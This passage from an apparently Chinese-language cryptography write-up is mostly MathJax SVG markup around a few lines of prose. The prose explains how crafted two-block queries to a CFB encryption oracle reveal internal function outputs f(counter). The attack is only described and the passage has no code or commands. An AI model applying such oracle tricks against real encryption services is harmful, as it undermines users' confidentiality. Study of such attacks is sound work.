transform="translate(5132.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5577.2,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(6127.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6516.2,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(6949.2,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(7434.2,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(8006.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(8606.2,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(8967.2,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(9433.2,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(10320.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10709.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(11154.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(12493.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(12937.8,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(13487.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(13876.8,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(14309.8,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(14794.8,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(15366.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(15966.8,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(16327.8,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(16793.8,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mo" transform="translate(17681.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 的內容.</p><p>第二個 query, 我們送 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="25.375ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 11215.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(1372,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2429,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3029,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(3390,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(3856,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(4743.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5354.8,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g><g data-mml-node="mi" transform="translate(6355,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(6788,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(7273,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(7845,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(8445,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(8806,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(9272,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(10159.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(10437.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mn" transform="translate(10715.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>  共兩個 block 的訊息的 CFB (<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="1.258ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 556 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(278,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container> 表示把兩個 blocks 接在一起). 可以發現回傳結果的第二個 block 就會是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.612ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5132.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" 